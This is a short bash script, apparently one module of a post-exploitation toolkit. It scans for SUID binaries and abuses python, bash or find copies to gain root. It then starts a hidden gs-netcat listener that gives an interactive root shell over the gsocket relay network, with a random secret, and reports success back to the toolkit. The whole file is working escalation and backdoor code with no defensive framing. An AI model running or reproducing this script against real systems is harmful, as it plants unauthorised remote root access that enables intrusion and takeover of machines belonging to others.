#!/bin/bash
source "$(dirname "$0")/00_common.sh"
M="suid"
info "Scanning SUID..."
for bin in $(find / -perm -4000 -type f 2>/dev/null); do
    name=$(basename "$bin")
    case "$name" in
        python*|python2|python3)
            if "$bin" -c 'import os;os.setuid(0);print("ok")' 2>/dev/null|grep -q ok; then
                s=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
                "$bin" -c "import os;os.setuid(0);os.system('nohup gs-netcat -s $s -l -i &>/dev/null &')" 2>/dev/null
                result "$M" "success" "$bin" "$s"; exit 0
            fi;;
        bash|sh)
            if "$bin" -p -c 'id'|grep -q "uid=0"; then
                s=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
                "$bin" -p -c "nohup gs-netcat -s '$s' -l -i &>/dev/null &" 2>/dev/null
                result "$M" "success" "$bin" "$s"; exit 0
            fi;;
        find)
            s=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
            "$bin" . -exec /bin/sh -p -c "nohup gs-netcat -s '$s' -l -i &" \; 2>/dev/null && { result "$M" "success" "$bin" "$s"; exit 0; };;
    esac
done
result "$M" "fail" "No exploitable SUID" ""; exit 1
